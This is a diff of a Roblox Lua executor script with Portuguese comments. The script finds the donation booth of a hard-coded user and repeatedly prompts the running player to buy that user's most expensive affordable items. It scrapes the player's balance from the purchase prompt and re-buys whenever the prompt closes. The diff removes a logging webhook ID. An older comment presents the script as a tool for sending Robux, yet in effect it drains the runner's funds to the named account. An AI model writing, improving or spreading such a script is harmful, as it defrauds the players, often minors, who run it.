@@ -1,19 +1,11 @@
-local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
-local request = syn and syn.request or request
-if typeof(request) ~= "function" then
-    error("Request function not found!")
-end
-
+local UserInputService = game:GetService("UserInputService")
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
 
--- Coloque aqui o username do jogador que você quer enviar Robux
+-- Nome do jogador que vai receber
 local Username = "Ian_wp27"
 
 local success, UserId = pcall(function()
@@ -32,14 +24,12 @@ if not Booth then
 end
 
 local asset
-local userRobux
+local userRobux = 0
 
--- Função de compra: escolhe o **maior preço que você consegue pagar**
+-- Função de compra: escolhe o item mais caro que você consegue comprar
 local function Purchase()
     local bestPrice = 0
     asset = nil
-
-    userRobux = tonumber(userRobux) or 0
 
     for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
         local assetType = v:GetAttribute("AssetType")
@@ -59,20 +49,26 @@ local function Purchase()
     end
 end
 
--- Espera o PurchasePromptApp aparecer (funciona para mobile e PC)
+-- Espera o PurchasePromptApp aparecer
 local PurchasePromptApp
 repeat
     PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
     task.wait(0.1)
 until PurchasePromptApp
 
--- Ajusta o botão para mobile (esquerda)
+-- Ajusta a posição do prompt para mobile
 local function FixMobilePrompt()
     local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
     animator.ChildAdded:Connect(function(child)
         if child.Name == "Prompt" then
-            -- centraliza ou move para a esquerda no mobile
-            if game:GetService("UserInputService").TouchEnabled then
+            -- Lê saldo do texto do prompt
+            local balanceLabel = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+            if balanceLabel then
+                userRobux = tonumber(balanceLabel.Text:match("%d+")) or 0
+            end
+
+            -- Move botão para esquerda se for mobile
+            if UserInputService.TouchEnabled then
                 child.Position = UDim2.new(0, 50, 0.5, -child.Size.Y.Offset/2)
             else
                 child.Position = UDim2.new(0.5, -child.Size.X.Offset/2, 0.5, -child.Size.Y.Offset/2)
@@ -83,7 +79,7 @@ end
 
 FixMobilePrompt()
 
--- Lógica de monitoramento para saldo e compras automáticas
+-- Monitora o fechamento do prompt para comprar novamente
 local function MonitorPurchases()
     local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
     animator.ChildRemoved:Connect(function(child)
@@ -95,6 +91,5 @@ end
 
 MonitorPurchases()
 
--- Pega o item inicial
-userRobux =  tonumber(Remotes.Function("GetUserRobux"):InvokeServer()) or 0
+-- Faz a primeira compra
 Purchase()
